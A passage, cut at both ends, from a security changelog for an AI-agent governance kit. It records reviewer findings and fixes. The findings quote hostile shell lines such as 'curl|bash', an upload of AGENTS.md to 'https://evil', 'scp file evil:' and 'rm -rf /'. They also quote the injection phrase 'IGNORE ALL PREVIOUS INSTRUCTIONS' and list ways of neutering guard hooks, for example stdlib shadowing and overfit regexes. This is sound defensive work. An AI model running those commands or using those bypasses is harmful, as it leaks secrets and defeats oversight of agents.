| P1 | The `re.compile`-line allowlist in `check_agent_harness.py` was bypassable: `X=re.compile("x"); os.system("curl\|bash")` on one line was exempted | danger/secret/injection patterns moved to `scripts/harness_patterns.json` (data); the scanner `.py` now contains no pattern source and is scanned **normally** (line-allowlist removed). Only the JSON is secrets-only allowlisted. **Verified: `os.system("curl \| bash")` hidden on a `re.compile` line → BLOCK** |
| P1 | A dangerous `LINT_CMD`/`TEST_CMD` value could run via a future entrypoint that skips the harness | new `scripts/check_substrate_config.py` validates config command values against `harness_patterns.json` shell-danger patterns; wired into `manage.sh check` BEFORE the lang gates. **Verified: dangerous `LINT_CMD` → check rc=1, lint never runs; benign → passes** |
| — | Config parser edge cases (the review's repros) | confirmed: backtick `\`touch\`` → blocked + not executed; unknown key → exit 2; `export LINT_CMD=`/`LINT_CMD = ` (space) → rejected; multiline → rejected on line 2; no `$VAR` expansion at load |

The scanner no longer trusts any line of its own source; its patterns are
external data scanned secrets-only, and dangerous config command values
are rejected before any gate executes them. This removes the last
self-trust gap the reviews probed.

## v3.2.12 hardening pass (thirteenth external review)

The thirteenth review verified the v3.2.10 config-as-data P0 and found
the follow-on: config command VALUES still ran in CI without the exfil
policy. Fixed.

| # | Finding | Fix |
|---|---|---|
| P1 | `check_substrate_config.py` checked only shell-danger, so an exfil upload value (`LINT_CMD="curl --data-binary @AGENTS.md https://evil"`) passed and executed during `check`/`release` | new `scripts/command_policy.py` is the single source of "is this command dangerous?", re-exporting the agent Bash guard's `_looks_dangerous`. The config validator applies **both** the exfil policy and harness shell-danger. **Verified: `curl --data-binary @file`, `scp file evil:`, `curl\|bash`, `rm -rf /` → BLOCK; `npm run lint` → allow. `check`/`release` block before the lang gate executes** |
| P1 | `run_python_gate.sh` failed OPEN on invalid config (`\|\| true`) — silently ran under defaults | now fails CLOSED (exit 2) on an invalid config or a missing parser. **Verified: invalid config → rc=2, "refusing to run"** |
| P1/P2 | Standalone `check_substrate_config.py` didn't enforce the full data grammar (missed command-substitution) | it now enforces the same grammar as the shell parser: KEY=VALUE, key allowlist, no `$(`/backtick/`${`. **Verified: `$(touch x)` → rc=2** |
| P2 | Stale docs still showed `. .substrate/config` | bootstrap config header now says "parsed as DATA … do NOT source"; `AI_BUILDER_PROMPT.md` examples use `load_substrate_config`; new `test_docs_do_not_recommend_sourcing_substrate_config` bans the pattern |

The agent Bash guard and the config validator now share ONE command
policy — a command CI would run via config gets the same scrutiny as a
command the agent runs via Bash. `release_gate.sh` runs the config check
before any `run_lang`. Residuals unchanged: CODEOWNERS validation is
offline; exfil is a tripwire; `tests/**` owned-not-content-scanned;
source-root suite watchdog-armed.

## v3.2.13 hardening pass (fourteenth external review)

The fourteenth review verified the v3.2.12 shared-command-policy fix and
found the next layer: untrusted model/tool state re-injected into context,
a fail-OPEN path in the policy loader, and unvalidated config enums.

| # | Finding | Fix |
|---|---|---|
| P1 | A TodoWrite item containing an instruction (`"IGNORE ALL PREVIOUS INSTRUCTIONS…"`) or a command (`curl … \| bash`) was persisted verbatim into `docs/CURRENT_SESSION.md`, which `SessionStart` re-injects as durable context — a compaction-surviving prompt-injection channel | `session_handoff.py` now sanitizes every TODO label through `_safe_todo_text`: instruction-prefix strip, secret redact, 200-char cap, and a hard replace if it matches `_TODO_INJECTION`/`_TODO_SHELLISH`; items capped at 30; status validated against a fixed set; section relabeled **"TODO state — UNTRUSTED model/tool state"**. **Verified: poisoned TODO → `[instruction-line stripped]`/`[todo text stripped]` in handoff and in the restored `additionalContext`; benign label survives** |
| P1 | `command_policy.py` defined a permissive fallback, so if `check_exfil_guard.py` failed to import the config validator silently allowed every command value (fail-open) | the fallback is removed: import failure sets `_IMPORT_ERROR` and `looks_dangerous_command`/`profile()` raise `CommandPolicyUnavailable`. `check_substrate_config.py` converts that to **exit 2**. **Verified: broken policy source + benign-looking `LINT_CMD` → rc=2, "command policy" — never rc=0** |
| P1 | Invalid config enum values (`SUBSTRATE_PROFILE="stirct"`) and unbalanced quotes were accepted, silently falling through to defaults and disabling strict governance | both the shell loader (`_substrate_config.sh`) and the Python validator now reject out-of-domain enums (PROFILE∈starter\|standard\|strict, LANG∈python\|node\|go\|none, RUNNER∈auto\|uv\|python\|poetry) and unbalanced quotes, in lockstep. **Verified: `./manage.sh doctor --quick` with `stirct` → rc=2 "invalid SUBSTRATE_PROFILE" before any gate; both validators agree on 14/14 cases** |
| P1/P2 | The config validator ran in `check`/`release` and CI but not in the local pre-commit hook | `templates/pre-commit-config.yaml.template` now wires `check-substrate-config` (all profiles, before the harness check) so a poisoned config is caught at commit time, not only in CI |
| P2 | The subprocess test helper killed only the direct child on timeout, orphaning gate-spawned grandchildren | `_run` now uses `start_new_session=True` and `os.killpg(…, SIGKILL)` on `TimeoutExpired`, so a hung gate subprocess can't survive the test that spawned it |

Now untrusted model/tool state (transcript turns AND TodoWrite labels) is
neutralized before it can re-enter context; the command policy fails
CLOSED; and config enums are validated identically by the shell loader and
the Python validator. Residuals unchanged: CODEOWNERS validation is
offline; exfil is a tripwire; `tests/**` owned-not-content-scanned;
source-root suite watchdog-armed.

## v3.2.14 hardening pass (fifteenth external review)

The fifteenth review confirmed the v3.2.13 fixes and found that the
SAFETY-POLICY LAYER ITSELF was unguarded: the pattern DATA could be
weakened, and a syntactically broken security hook passed normal checks.

| # | Finding | Fix |
|---|---|---|
| P1 | Moving the danger regexes into `harness_patterns.json` (v3.2.13) made it a mutable policy file scanned secrets-only. Setting `"shell_danger": []` silenced BOTH the harness AND `check_substrate_config.py`, after which `./manage.sh check` executed a `curl\|bash` `LINT_CMD`. **Repro confirmed: marker file written.** | new `scripts/check_harness_patterns.py` validates the policy data: JSON shape, all regexes compile, a fixed set of must-block canaries are still caught, and benign canaries are not (over-broad guard). Canaries are base64 so this validator carries no plaintext danger strings (the harness scans it). Wired into `check`, `release_gate.sh`, pre-commit, and doctor — **before** the harness/config trust the data. **Verified: `shell_danger:[]` → `./manage.sh check` BLOCKS at `check-harness-patterns`, dangerous LINT_CMD never runs (no marker)** |
| P1 | A syntactically broken security hook (e.g. `scripts/check_exfil_guard.py`) passed `check`/pre-commit when `.substrate/config` had no command values. At runtime the broken hook exits rc 1 — **not** the blocking rc 2 — silently degrading a security control. | new `scripts/check_python_syntax.py` `py_compile`s all of `scripts/` and `tests/`. Wired first (other validators import these files) into `check`, `release_gate.sh`, pre-commit, and doctor. **Verified: broken `check_exfil_guard.py` → `./manage.sh check` BLOCKS at `check-python-syntax`** |
| P2 | `check_substrate_config.py` returned `[]` shell-danger patterns if `harness_patterns.json` was malformed — fail-OPEN for the pipe-to-shell check. | `_shell_danger_patterns()` now raises `HarnessPatternsUnavailable`; `main()` converts it (and `CommandPolicyUnavailable`) to **exit 2**, loaded lazily so an empty-command config never depends on it. **Verified: corrupt patterns + a command value → rc 2, "harness_patterns.json unavailable or invalid"** |
| P2 | `todo_state_hook.py` wrote raw TodoWrite items with no item/content caps; `session_handoff.py` read the whole file before its 30-item cap (tool-state DoS). | write-time caps (100 items, 500 chars/content, 32 chars/status) in `todo_state_hook.py`; a 200 KB size-guard in `session_handoff._todo_lines`. **Verified: 500×5 KB payload → ≤100 items, each ≤500 chars; 20k-item file → "todo state skipped: file too large"** |
| P2 | The "source-root suite passes from the extracted zip" claim was not reproducible (reviewer's container timed out). | new `package_release.sh` (kit root, NOT installed into generated repos): cleans caches, builds the zip, extracts it, and runs the full suite FROM THE ARTIFACT with `PYTHONNOUSERSITE=1 PYTEST_DISABLE_PLUGIN_AUTOLOAD=1` and a wall-clock cap — one reproducible command. Smoke tests added for `check_exfil_guard.py` (rc 2) and `copilot_hook_adapter.py` (deny) so a hook that *compiles but misbehaves* is also caught. |

The safety policy is now self-defending: weakening the pattern data or
breaking a governed Python hook BLOCKS the gate before the harness/config
rely on it. Validator order is `check_python_syntax` → `check_harness_patterns`
→ `check_agent_harness` → `check_substrate_config`.

**Pushed back (with reasoning), not implemented — `tests/**` content scan.**
The review suggested scanning `tests/**/*.py` for secrets + shell-danger.
Rejected for THIS codebase: the adversarial fixtures (`curl … | bash`,
`sk-…` fake keys, `--dangerously-…` flags) live INLINE in
`tests/test_hook_scripts.py`, not in a separable `tests/fixtures/` dir, so
a secrets+shell-danger scan would false-positive on the suite's own
required test data. `tests/**` stays required-OWNED (CODEOWNERS) but not
content-scanned — the deliberate tradeoff documented since v3.2.x. Moving
fixtures into a scannable layout is future work, not a shipped half-measure.

## v3.2.15 hardening pass (sixteenth external review)

The sixteenth review confirmed the v3.2.14 policy-integrity gates and found
the next layer: the gates checked that the policy EXISTS, not that it
GENERALIZES or that the hooks still DENY.

| # | Finding | Fix |
|---|---|---|
| P1 | `check_harness_patterns.py` checked fixed canaries, so a policy overfit to exactly those strings (`shell_danger` = anchored `^…$` regexes matching only the static canaries) PASSED, then `./manage.sh check` ran a *different* `curl\|bash` LINT_CMD. **Repro confirmed: marker written.** | added DYNAMIC canaries — base64 templates with a `{T}` placeholder filled by a fresh `uuid4` token each run, so a policy must match the dangerous STRUCTURE, not a literal. Plus required-label checks (anti-obfuscation). **Verified: anchored exact-canary policy → BLOCK "dynamic canary not caught"; shipped policy passes 5/5 runs; `./manage.sh check` blocks the overfit before the LINT_CMD runs (no marker)** |
| P1 | A syntactically valid but allow-all `check_exfil_guard.py` (returns `None` for everything) passed syntax + harness + config, then failed to block `cat .env` at runtime. Syntax ≠ behavior. | new `scripts/check_hook_smoke.py` EXERCISES the deployed hooks: `check_exfil_guard.py` must exit 2 on a secret-read and on a local-file upload; `copilot_hook_adapter.py` must deny the upload; `session_handoff.py restore` must emit valid JSON; and `check_substrate_config.py` must flag a dangerous LINT_CMD (exercises the shared `command_policy` end-to-end, so a `command_policy`-only neuter is caught even when the hook is intact). base64 payloads so it carries no plaintext danger. Wired into `check`/`release_gate.sh`/pre-commit/doctor. **Verified: allow-all hook → BLOCK; neutered command_policy (hook intact) → BLOCK at the config probe** |
| P2 | Generated repos were wired, but the kit's OWN source-root scaffold (`manage.sh`, `.pre-commit-config.yaml`) was stale vs the templates, and `check_doc_drift --strict` flagged the new scripts/extras as uncovered. | root `manage.sh` synced from `templates/manage.sh.template`; the three new validators added to root `.pre-commit-config.yaml`; `docs/knowledge/00_substrate.md` coverage regenerated for all `scripts/*.py`, `scripts/*.sh`, and `extras/*.py`. **Verified: `check_doc_drift --strict` → "no drift"; new tests assert root scaffold ⊇ template validators** |
| P2 | `test_doc_consistency` scanned a leftover source-root `.venv`, false-failing `test_no_stale_python_version` on a dependency's `python3.13` string. | `_scannable`/`_docs` now skip generated state (`.venv`, `venv`, `dist`, `build`, `node_modules`, cache dirs) via kit-RELATIVE parts; `package_release.sh` strips generated state from the extracted artifact before the suite. |

Validator order is now `check_python_syntax` → `check_harness_patterns` →
`check_hook_smoke` → `check_agent_harness` → `check_substrate_config`. The
policy layer is now checked for EXISTENCE, GENERALIZATION (no overfit), and
BEHAVIOR (hooks actually deny).

**Pushed back (with reasoning) — relocating detection into `command_policy.py`.**
The review recommended moving `_looks_dangerous` out of `check_exfil_guard.py`
into `command_policy.py` so config validation doesn't depend on a "hook
script". Examined and judged cosmetic for THIS code: the hook ADAPTER
(`main()` — stdin/JSON parsing, exit codes) is already separate from the pure
DETECTION function (`_looks_dangerous`), and `command_policy` already imports
ONLY the detection function, never the adapter. Editing the adapter cannot
change config validation today. The new behavioral smoke gate catches a neuter
of EITHER file regardless of which module owns the lines, so the relocation
changes no security property. Deferred as a non-urgent readability refactor
rather than a risky move of the most-tested security file.

## v3.2.16 hardening pass (seventeenth external review)

The seventeenth review confirmed v3.2.15's gates but showed the validators
checked CANARY CONFORMANCE, not GENERALIZATION: a policy overfit to the
static AND the (predictable) dynamic-canary SHAPES passed, then a different
dangerous command ran. The reviewer reproduced three overfit false-greens
and **refuted the v3.2.15 pushback** with a compile-clean `_looks_dangerous`
overfit that weakened both the hook and config paths. Conceded and fixed
structurally — the endgame is to make required detections non-overfittable.

| # | Finding | Fix |
|---|---|---|
| P1 | `check_harness_patterns.py` only checked canary conformance, so a `harness_patterns.json` overfit to the static + dynamic-template shapes passed; `./manage.sh check` then ran a different `curl\|bash` LINT_CMD. **Repro confirmed: marker written.** | **HASH-PIN.** Each required regex's canonical SHA-256 is pinned in `REQUIRED_PATTERN_SHA256`. A weakened/overfit regex has a different hash → BLOCK. Weakening now requires editing the validator (a reviewed, CODEOWNED act); extra project patterns stay additive. Dynamic canaries + required-labels kept as cheap cross-checks. **Verified: dynamic-template overfit → BLOCK "hash mismatch"; `./manage.sh check` blocks before the LINT_CMD runs (no marker)** |
| P1 | A compile-clean `check_exfil_guard.py` / `command_policy.py` overfit to the FIXED smoke strings (`cat .env`, one `curl --data-binary` upload) passed the smoke and then allowed a *different* upload. | **(a)** detection moved into `command_policy.py` (now the owner); `check_exfil_guard.py` is a thin adapter that imports it — so editing the adapter can't change config validation (this is the v3.2.15 pushback, now **conceded** and done). **(b)** `check_hook_smoke.py` adds an INTEGRITY HASH-PIN of the critical detection regexes and RANDOMIZED behavioral families (curl `--data-binary`/`-F`, wget `--post-file`, scp, rsync uploads + several secret reads) run through BOTH the hook and the config validator with a fresh token each run. **Verified: exact-smoke exfil-guard override → BLOCK (families); exact-canary command_policy → BLOCK (integrity hash + families)** |
| P1/P2 | `command_policy.py` imported `_looks_dangerous` FROM `check_exfil_guard.py`, so the hook file was still the policy implementation. | dependency inverted: `command_policy.py` owns detection; `check_exfil_guard.py` re-exports it for back-compat. `check_substrate_config.py` fails CLOSED (exit 2) if `command_policy` can't import. **Verified: broken `command_policy.py` + a command value → rc 2** |
| P2 | The "Agent config audit" workflow ran only `check_agent_harness.py`, so it could show green while the policy layer was broken and main CI was red. | the workflow now runs the full chain (`check_python_syntax` → `check_harness_patterns` → `check_hook_smoke` → `check_agent_harness` → `check_substrate_config`), matching `manage.sh check`. |
| P2 | `package_release.sh` artifact-test hung opaquely in the reviewer's slow container (no clue which test wedged). | added a watchdog: dumps the process tree at `DUMP_AFTER` (180s) for attribution, hard-SIGKILLs at `HARD_CAP` (300s); both env-overridable. Each test still carries its own 30s subprocess cap. |

The required detections are now **non-overfittable**: their canonical SHAs are
pinned, so satisfying the validator with a weakened regex is impossible
without an explicit, reviewable pin update. Behavior is cross-checked with
randomized command families, not fixed strings. Two regression tests assert
the pins themselves match the shipped regexes (so a forgotten pin update is
caught). Validator order unchanged.

## v3.2.17 hardening pass (eighteenth external review)

The eighteenth review confirmed v3.2.16's hash-pins but showed they pinned
the DATA, not the LOGIC or the BEHAVIOR. Three reproduced false-greens, all
"the pinned thing is intact but the thing that uses it is neutered".

| # | Finding | Fix |
|---|---|---|
| P1 | `command_policy.py` logic could be overfit while every pinned regex stayed intact: appending a second `looks_dangerous_command` (the later def wins) that blocks only the smoke families passed `check_hook_smoke` + `check_substrate_config`; `./manage.sh check` then ran a different upload. **Repro confirmed: marker written.** | new `scripts/check_command_policy_integrity.py` AST-PINS the critical definitions (`looks_dangerous_command`, `_is_scp_push`, `profile`, `INTEGRITY_REGEXES`, `_VALID_PROFILES`). A later redefinition trips a duplicate-definition check; an in-place logic edit changes the normalized-AST SHA. Normalization uses `ast.unparse` (docstring-stripped) — version-stable across 3.11+, unlike `ast.dump`. Wired before `check_hook_smoke`. **Verified: appended 2nd def → BLOCK "duplicate"; in-place edit → BLOCK "AST hash mismatch"; `./manage.sh check` blocks before the LINT_CMD runs (no marker)** |
| P1 | `check_agent_harness.py` itself could be replaced with a compile-clean allow-all stub; injected prompt-injection text in AGENTS.md then reached model context. No gate tested the SCANNER's behavior. | new `scripts/check_harness_smoke.py` runs the ACTUAL scanner against a throwaway repo whose AGENTS.md carries a RANDOMIZED injection phrase, and asserts it blocks + reports the finding. A stubbed scanner returns 0 and fails here. Wired after `check_harness_patterns`, before `check_agent_harness`. **Verified: stubbed scanner → BLOCK "did not block"; `./manage.sh check` blocks at `check-harness-smoke`** |
| P1/P2 | The runtime hook's `command_policy.profile()` returned the raw config value, so a typo'd `SUBSTRATE_PROFILE="stirct"` silently downgraded strict to standard at the runtime boundary (the gate rejects it, but the hook can fire before/independent of the gate). | `profile()` now validates against `{starter,standard,strict}` and raises `CommandPolicyUnavailable` on an invalid value; `check_exfil_guard.py` and `copilot_hook_adapter.py` translate that to a BLOCK / deny (fail closed). **Verified: `stirct` + a strict-only command → exfil-guard rc 2, copilot deny; valid profile unaffected** |
| P2 | `package_release.sh` hang diagnostics fired only at 180s. | added an EARLY process-tree dump at 90s (env-overridable) so a wedged test is attributable sooner, plus the existing 180s dump and 300s hard kill. |

The substrate now pins three layers — pattern DATA (regex hashes), policy
LOGIC (AST hashes), and scanner/hook BEHAVIOR (randomized smoke) — and the
runtime hook fails closed on an invalid profile. Two drift-guard tests assert
the AST/regex pins match the shipped sources. Validator order:
`check_python_syntax` → `check_harness_patterns` → `check_command_policy_integrity`
→ `check_harness_smoke` → `check_hook_smoke` → `check_agent_harness` →
`check_substrate_config`.

## v3.2.18 hardening pass (nineteenth external review)

The nineteenth review confirmed v3.2.17's pins but showed two ways to weaken
the policy WITHOUT touching a pinned node, plus the deepest structural point:
the gate runs validators FROM the PR, so it can't be its own root of trust.

| # | Finding | Fix |
|---|---|---|
| P1 | The AST pin covered the decision function but NOT the HELPER regex variables it calls. Reassigning `_NET_UPLOAD_FILE = re.compile(<overfit>)` after the pins (leaving `INTEGRITY_REGEXES` intact) passed every check; `./manage.sh check` then ran a different upload. **Repro confirmed: marker written.** | the integrity check (renamed `check_command_policy_integrity.py` → `scripts/check_policy_code_integrity.py`) now AST-pins **every** critical definition: the decision function, `_is_scp_push`, `profile`, `_VALID_PROFILES`, `_MAX_CMD_LEN`, AND all ~22 detection-regex constants. A reassignment trips the duplicate check; an edit changes the hash. `check_hook_smoke.py` additionally hashes the **LIVE** regex objects (`_NET_UPLOAD_FILE.pattern`), not the frozen dict, so a nested/conditional reassignment is caught too. **Verified: helper reassign → BLOCK "duplicate _NET_UPLOAD_FILE" + live-regex hash mismatch; `./manage.sh check` blocks before the LINT_CMD runs (no marker)** |
| P1 | `check_agent_harness.py` could be overfit to the single harness-smoke injection template (block only that phrase, ignore real injections). | the scanner's `_load_patterns` / `_glob` / `main` are now AST-pinned by `check_policy_code_integrity.py` (an overfit/stub scanner changes them → BLOCK), and `check_harness_smoke.py` now rotates **4 injection families across 2 governed surfaces** per run. **Verified: scanner overfit → BLOCK at the AST pin; multi-family smoke stable over runs** |
| P1 | **Root of trust.** Every validator runs from the PR, so a PR that edits both a policy file and its validator can pass its own gate. A repo-local gate is developer feedback, not the final authority. | new `workflows/trusted-base-audit.yml.template` (installed for strict by bootstrap): checks out the protected **base branch**, overlays the base VALIDATORS (and their pins) onto the PR workspace, and runs them against the PR's policy/data/context — the PR can change the target but not the validator that judges it. `check_policy_code_integrity.py` also gained `--root` for the same purpose. README "Root of trust (strict)" documents that this check **must be required via branch protection**; that combination, not the local gate, is the strict root of trust. |
| P2 | `package_release.sh` reviewer-mode diagnostics. | early dump now env-tunable (`SUBSTRATE_ARTIFACT_EARLY_DUMP` etc); README/script document the fast-diagnostic invocation for constrained containers. |

Pins now cover policy + scanner LOGIC down to every helper regex (and the
live objects), behavior is randomized multi-family, and strict mode ships a
trusted-base CI runner so the final authority is base-branch code under
branch protection — not PR-controlled validators. Two drift-guard tests keep
the AST/regex pins honest. Validator order: `check_python_syntax` →
`check_harness_patterns` → `check_policy_code_integrity` →
`check_harness_smoke` → `check_hook_smoke` → `check_agent_harness` →
`check_substrate_config`.

## v3.2.19 hardening pass (twentieth external review)

The twentieth review confirmed v3.2.18's per-node pins but showed they could
be sidestepped by arbitrary top-level code AFTER the pinned nodes, and that
the trusted-base overlay MASKED PR changes to validators by overwriting them.

| # | Finding | Fix |
|---|---|---|
| P1 | Per-node AST pins didn't reject extra top-level code: appending `globals()["_NET_UPLOAD_FILE"] = <fake>` (a fake object preserving `.pattern` but overfitting `.search()`), or reassigning the scanner's `INJECTION` list, weakened behavior while every pinned node and the live-regex `.pattern` hash stayed intact. **Repro confirmed: dangerous command executed.** | `check_policy_code_integrity.py` now pins the **WHOLE normalized-module AST** of `command_policy.py` and `check_agent_harness.py` (`MODULE_AST_SHA256`). ANY added statement, reassignment, fake object, or edit changes the module hash → BLOCK. `check_hook_smoke.py` additionally rejects a `_NAME` that is **not a real `re.Pattern`** (`type(obj) is re.Pattern`). **Verified: fake-regex-object → BLOCK "module AST hash mismatch"; INJECTION reassign → BLOCK; fake object → hook-smoke "not a real re.Pattern"; `./manage.sh check` blocks before the LINT_CMD runs (no marker)** |
| P1 | The trusted-base workflow **overwrote** the PR's validators with base copies before auditing, so a PR that modified a validator was masked (the modified file was erased, the audit passed, the PR could merge and become base). | the workflow now **freezes** validator/policy code instead of overlaying it: a `git diff origin/<base>...HEAD` guard FAILS the check on ANY change to a trusted file (`scripts/check_*.py`, `command_policy.py`, the adapters, the inventory), routing such changes through the protected substrate release. The validators are then provably == base, so running them judges only the PR's data/content (which PRs may change). **Verified (bash): content-only PR → guard passes; validator-stub PR → guard BLOCKS with the changed path** |
| P2 | The kit's own `.github/workflows/agent-config-audit.yml` was stale (harness-only) while the template ran the full chain. | root workflow synced from the template; new `test_source_root_agent_config_audit_matches_template` keeps it current. |
| P2 | `docs/manifest.json` was stale in the shipped tree, so source-root `manage.sh check` failed before the policy chain. | manifest regenerated; new `test_source_root_manifest_is_current` blocks a stale manifest from shipping. |

Policy/scanner code is now pinned as a WHOLE module (no top-level mutation
escapes), the live regex objects must be real `re.Pattern`s, and the
trusted-base runner audits PR validator changes by **refusing** them rather
than overwriting them. A drift-guard test keeps `MODULE_AST_SHA256` honest.

## v3.2.20 hardening pass (twenty-first external review)

The twenty-first review confirmed v3.2.19's whole-module pins but found the
EXECUTION root of trust: the validators trusted their own interpreter import
environment and CI dispatcher, both PR-controlled.

| # | Finding | Fix |
|---|---|---|
| P1 | A PR could add `scripts/hashlib.py` (or `re.py`, `json.py`, …) to SHADOW the stdlib for the validators — a fake `sha256` returning the pinned hash for a weakened `harness_patterns.json` defeated every hash check, and `./manage.sh check` ran a dangerous command. **Repro confirmed: marker written.** | **(a)** new `scripts/check_import_shadowing.py` blocks any `scripts/**/*.py` whose stem is a stdlib module name (`sys.stdlib_module_names` — the complete set); it self-hardens by importing only the builtin `sys` until it scrubs its own path, and runs FIRST. **(b)** all substrate validators now run under `python -I` (isolated — the repo's `scripts/` dir is not auto-prepended to `sys.path`), in `manage.sh`, `release_gate.sh`, pre-commit, and the workflows. The three `_doc_common` importers gained an explicit `sys.path.insert` so they still load their local module under `-I`. **Verified: `scripts/hashlib.py` → `./manage.sh check` BLOCKS at `check-import-shadowing` (no marker); `-I` alone catches a weakened policy despite a fake `hashlib`** |
| P1 | The trusted-base freeze guard covered validator `.py` only, so a PR could replace `manage.sh` with `exit 0` (or edit a workflow) and neuter ordinary CI without the guard noticing. | the freeze set now covers ALL CI-execution surfaces — the whole `scripts/` dir, `manage.sh`, `.pre-commit-config.yaml`, and `.github/workflows/` (the one DATA file, `harness_patterns.json`, is carved back out as PR-extensible). The audit also runs `check_import_shadowing` first, isolated. **Verified (bash): `manage.sh`→`exit 0`, a workflow edit, and a validator stub each BLOCK; content + `harness_patterns.json` changes pass** |
| P1/P2 | No automated proof the operator actually configured GitHub branch protection (required checks, code-owner review), so the trusted-base job was advisory. | new `scripts/check_github_governance.py` (stdlib `urllib`) queries branch protection and verifies the trusted-base audit is a REQUIRED check, code-owner review is required, and force-push/deletion are blocked. It SKIPS gracefully without an admin token (offline/default-token) and BLOCKS on a readable-but-misconfigured branch; wired into the trusted-base workflow. **Verified: skips cleanly with no token** |
| P2 | `package_release.sh` reviewer diagnostics. | watchdog now also emits `pgrep -af` so a wedged test/process is attributable; thresholds remain env-tunable. |

The substrate now defends its EXECUTION environment, not just its policy:
no repo-local module can shadow the validators' stdlib (blocked + `-I`), and
the trusted-base freeze covers every file that runs CI, not only the policy
validators. A GitHub-API governance check proves the branch protection that
makes the trusted-base audit binding.

## v3.2.21 hardening pass (twenty-second external review)

The twenty-second review confirmed v3.2.20's import-shadow + CI-freeze fixes
and found the next authority gap: STRICT mode itself could be downgraded.

| # | Finding | Fix |
|---|---|---|
| P1 | `.substrate/config` is editable DATA, so a PR could flip `SUBSTRATE_PROFILE="strict"` → `"standard"`/`"starter"` to disable strict-only hook behavior; neither the freeze guard nor any gate caught the downgrade. **Repro confirmed: strict-only exfil rule disabled.** | **PROFILE LOCK.** bootstrap writes `.substrate/required_profile` (the minimum). `check_substrate_config.py` rejects a config below it (rc 2), and `command_policy.profile()` clamps UP to it at the runtime hook boundary — so a downgraded config can't disable strict-only rules even before CI runs. The trusted-base guard freezes `.substrate/required_profile` and FAILS any diff that changes `SUBSTRATE_PROFILE`. `.substrate/required_profile` is now a strict-CODEOWNED surface. **Verified: required=strict + config=standard → validator rc 2; runtime hook still blocks the strict-only rule; raising to strict allowed; `./manage.sh check` blocks a downgrade end-to-end** |
| P1/P2 | The trusted-base job ran the policy-integrity chain but not strict GOVERNANCE (CODEOWNERS coverage/placeholder/3 MB), so it didn't fully verify the strict contract it is documented as. | new `substrate_doctor.py --strict-governance` mode runs the STATIC governance checks WITHOUT the operational venv check (so it works in the venv-less trusted-base job); wired into the trusted-base workflow. **Verified: `--strict-governance` runs without a venv** |
| P2 | The freeze guard froze ALL of `scripts/`, which would block legitimate project scripts in real repos. | documented that **strict mode reserves `scripts/` for substrate-controlled code** (project scripts live elsewhere) — the simplest safe contract for the substrate-owned `scripts/` directory; a precise frozen-path manifest is deferred. |
| P2 | `check_github_governance.py` didn't verify ordinary CI is required. | it now also requires a CI/test/build status check, so a PR can't merge with the policy audit green but project tests optional. |

Strict is now a one-way ratchet: a repo can raise its profile but a PR cannot
silently lower it (gate + runtime + frozen profile), and the trusted-base job
verifies strict governance, not only policy integrity.

## v3.2.22 — maturity batch 1 (toward all-A; not a bug-fix round)

The 22nd review declared the regex/AST/local-policy core **saturated** and
gave an A-roadmap: the remaining non-A grades are reproducibility, polyglot
proof, structured memory, sandbox, evals, and operator-enforced GitHub
settings — not "one more local bypass". This batch ships the `[code-fixable]`
items that move several grades to A without new dependencies.

| Area → grade target | Change |
|---|---|
| Release reproducibility, artifact identity → A | `package_release.sh` gains `--smoke` (fast, deterministic ~30s: validator chain + fresh standard-none install + strict profile-lock, no full pytest) and `--full` (adds the suite). Ships **versioned** `…-<version>.zip` + `.sha256` + `RELEASE_MANIFEST.json` (version, commit, artifact + source-tree SHAs, test summary, built_at). Zip-hygiene gate. Watchdog now tails the current pytest test name; early dump at 30s. Fixes the reviewer's recurring "timed out in my container". |
| Polyglot support → A | new kit-self `.github/workflows/release-matrix.yml`: profile × language matrix (starter/standard/strict × python/node/go/none) bootstraps a fresh repo per combo and runs the static chain + profile-lock; a `full-setup` job does setup+check for representative combos. |
| Memory / compaction resistance → A | the handoff is now **structured-source-of-truth**: `session_handoff.py capture` writes `.substrate/memory/tasks/current.json` (sanitized branch/head/commits/working-tree/todos); `restore` builds the SessionStart context **from the JSON**, not by parsing markdown (`CURRENT_SESSION.md` is now purely a derived human view). `release_gate.sh` verifies the memory hash chain (`--anchor` in strict when an anchor note exists). Structured state gitignored. |
| Harness scanner behavior → A | `check_harness_smoke.py` now rotates injection families across **3** governed surfaces per run and reports coverage. |

No security regressions; 133 tests pass from the extracted artifact. The
remaining gaps are the larger v4 layers — **sandbox/egress** (exfil/secret →
A), **eval/trace harness** (observability → A), and **operator-enforced
branch protection** (governance/CODEOWNERS/trusted-base → A via the shipped
`check_github_governance.py --require` + a one-command setup) — plus the
documented composite ceiling on "high-stakes production" (needs the operator
to enable protection + a sandbox runtime).

## v3.2.23 — Batch 1 corrections (two A-blocking bugs in v3.2.22)

The 23rd review found that two v3.2.22 maturity changes shipped with bugs
that blocked the grades they claimed. Both fixed.

| # | Finding | Fix |
|---|---|---|
| P1 | `package_release.sh --smoke` was misleading and hung: it omitted `--lang none` (so it bootstrapped a Python project and pulled tooling → timeout), didn't run `manage.sh setup` before `check` (pre-commit failed: no venv), and swallowed the result with `\|\| true`. | smoke now bootstraps `--profile standard --lang none` and runs the **full LOCAL validator chain DIRECTLY** with `python -I` (import-shadow, manifest, doc-drift, syntax, patterns, policy-integrity, harness-smoke, hook-smoke, agent-harness, config) — no `setup`, no pre-commit, no `\|\| true`. Honest scope ("full local chain", not "manage.sh check"). + a strict-none profile-lock check. **Verified: `--smoke` runs in ~10s (was timing out), any validator failure fails the release** |
| P1 | `session_handoff.py restore` still auto-fell back to re-injecting raw `docs/CURRENT_SESSION.md` when structured state was absent/stale — reintroducing the durable prompt-injection class via a stale/attacker-planted file. | **No Markdown fallback.** If `.substrate/memory/tasks/current.json` is missing/invalid, restore emits a SAFE CONSTANT message ("do not infer state from CURRENT_SESSION.md") and injects no prior-state content. Docs corrected across `AGENTS.md`, `README.md`, the `session-recovery` skill (×3), and the script docstring. **Verified: a poisoned CURRENT_SESSION.md with no structured state → restore injects nothing** |
| P2 | The zip is content-equivalent but not bit-for-bit reproducible; the header claimed "Deterministic". | reworded to "content-hash-recorded": the manifest's `source_tree_sha256` is the stable content guarantee; the zip is not byte-identical (archive metadata varies). |
| P2 | `--smoke` skipped the behavioral smokes / manifest / doc-drift while calling itself "validator chain". | smoke now runs the **full local chain** including `check_harness_smoke`, `check_hook_smoke`, `update_manifest --check`, and `check_doc_drift --strict`. |

133→135 tests pass from the extracted artifact. The reviewer confirmed: with
these two fixed, the regex/AST/local-policy core is saturated and the
remaining non-A grades are genuinely outside repo-local scope — sandbox,
operator-enforced branch protection, and the eval/trace harness (Batch 2).

## v3.2.24 — smoke robustness (the last artifact-local A-blocker)

The 24th review confirmed the v3.2.23 fixes but `package_release.sh --smoke`
